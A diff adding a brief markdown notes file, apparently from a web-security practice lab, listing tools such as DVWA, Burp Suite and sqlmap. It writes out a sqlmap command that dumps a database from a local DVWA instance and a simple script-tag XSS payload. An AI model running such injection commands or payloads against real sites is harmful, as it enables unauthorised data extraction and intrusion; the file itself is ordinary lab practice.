@@ -1,1 +1,19 @@
+# Tools and Commands Used
 
+## Tools
+- DVWA (Damn Vulnerable Web Application)
+- Burp Suite Professional
+- sqlmap
+- Firefox Browser
+- Kali Linux
+
+## Commands Used
+
+Find IP of DVWA:
+ip a / ip confg
+
+SQL Injection automation:
+sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<yourid>" --dump
+
+Manual XSS payload:
+<script>alert(1)</script>
